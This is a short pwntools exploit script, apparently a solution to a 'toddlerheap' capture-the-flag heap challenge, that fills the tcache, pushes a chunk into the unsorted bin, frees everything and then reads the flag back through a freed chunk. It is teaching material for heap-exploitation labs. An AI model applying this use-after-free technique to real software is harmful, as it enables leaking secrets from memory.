from pwn import *

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level1.1")

def fillup_tcache():
    for idx in range(7):
        p.sendline(f'malloc {idx} 1024')

fillup_tcache()

# unsorted bin
p.sendline(b"malloc 7 1024")

# free all
for idx in range(8):
    p.sendline(f'free {idx}')

p.sendline(b"read_flag")
p.sendline(b"puts 7")
p.interactive()
